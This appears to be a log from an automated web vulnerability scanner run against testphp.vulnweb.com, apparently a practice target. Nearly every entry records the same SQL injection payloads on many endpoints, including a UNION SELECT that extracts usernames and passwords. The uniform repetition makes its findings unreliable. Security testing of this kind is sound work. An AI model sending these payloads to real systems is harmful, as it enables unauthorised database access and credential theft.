2025-03-05 01:29:51,980 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:29:51.980621', 'url': 'http://testphp.vulnweb.com/admin/', 'vulnerability': 'sensitive', 'payload': 'Sensitive File Found'}
2025-03-05 01:33:47,087 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:47.087327', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:47,398 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:47.398341', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:47,701 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:47.701944', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:47,910 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:47.910617', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:48,141 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:48.141892', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:48,418 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:48.418165', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:49,032 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:49.032846', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:49,343 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:49.342183', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:49,647 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:49.647442', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:49,954 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:49.954734', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:50,264 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:50.264755', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:51,298 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:51.298713', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:51,592 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:51.592259', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:51,899 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:51.899831', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:52,214 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:52.214443', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:52,517 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:52.517004', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:52,821 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:52.821452', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:53,128 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:53.128450', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:53,743 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:53.743589', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:54,058 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:54.058069', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:54,357 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:54.357260', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:54,664 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:54.664855', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:56,814 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:56.814519', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:57,123 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:57.123204', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:57,436 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:57.436180', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:57,737 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:57.737048', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:58,351 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:58.351893', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:58,664 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:58.664079', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:58,965 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:58.965568', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:59,273 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:59.273578', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:59,482 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:59.482044', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:59,702 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:59.702434', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:00,885 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:00.885664', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:01,118 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:01.118698', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:01,422 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:01.422922', 'url': 'http://testphp.vulnweb.com/artists.php?artist=2', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:05,796 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:05.795052', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:06,051 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:06.051868', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:06,270 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:06.270173', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:06,542 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:06.542988', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:07,161 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:07.161062', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:07,464 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:07.464359', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:07,771 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:07.771397', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:08,083 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:08.083948', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:14,018 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:14.018659', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:14,248 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:14.248797', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:14,533 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:14.533488', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:14,858 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:14.858351', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:15,456 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:15.456853', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:16,067 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:16.067645', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:16,373 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:16.373453', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:16,591 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:16.591738', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:20,163 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:20.163051', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:20,373 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:20.373641', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:20,581 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:20.581614', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:20,879 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:20.879294', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:21,495 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:21.495540', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:21,800 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:21.800943', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:22,108 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:22.107109', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:22,415 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:22.415966', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:22,722 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:22.722278', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:23,029 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:23.029257', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:23,336 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:23.336774', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:23,646 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:23.646829', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:25,489 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:25.489541', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:25,794 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:25.794501', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:26,102 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:26.102470', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:26,377 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:26.377870', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:26,920 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:26.920995', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:27,232 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:27.232681', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:27,536 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:27.536534', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:27,845 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:27.845163', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:31,221 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:31.221550', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:31,435 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:31.435069', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:31,644 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:31.644199', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:31,938 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:31.938680', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:32,553 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:32.553570', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:32,860 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:32.860014', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:33,167 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:33.167930', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:33,478 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:33.478484', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:33,782 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:33.782064', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:34,088 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:34.088932', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:34,399 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:34.399250', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:34,708 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:34.708148', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:38,083 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:38.083252', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:38,393 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:38.393750', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:38,696 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:38.696199', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:39,004 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:39.004059', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:39,618 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:39.618576', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:39,930 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:39.930108', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:40,239 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:40.239245', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:40,449 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:40.448184', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:43,714 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:43.714625', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:44,021 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:44.021558', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:44,229 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:44.229384', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:44,534 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:44.534475', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:45,151 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:45.151057', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:45,454 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:45.454933', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:45,761 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:45.761878', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:46,379 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:46.379095', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:46,684 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:46.684313', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:46,995 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:46.995715', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:47,300 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:47.300821', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:47,609 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:47.609717', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:49,464 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:49.464046', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:49,757 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:49.757073', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:50,063 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:50.063489', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:50,374 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:50.374406', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:51,374 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:51.374011', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:51,599 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:51.599842', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:51,907 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:51.907740', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:52,215 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:52.215680', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:52,521 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:52.521897', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:52,829 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:52.828420', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:53,136 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:53.135464', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:53,443 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:53.443601', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:53,750 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:53.750703', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:54,057 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:54.057886', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:54,364 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:54.364341', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
